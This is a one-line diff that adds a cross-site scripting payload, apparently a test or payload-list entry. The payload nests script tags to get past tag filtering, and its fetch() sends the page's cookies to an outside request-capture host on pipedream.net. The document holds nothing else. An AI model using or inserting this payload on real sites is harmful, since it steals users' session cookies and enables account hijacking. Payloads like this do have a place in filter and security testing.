@@ -1,0 +1,1 @@
+<scr<script>ipt>fetch('https://en1yiadox11os.x.pipedream.net/?param='+document[cookie])</scr</script>ipt>test
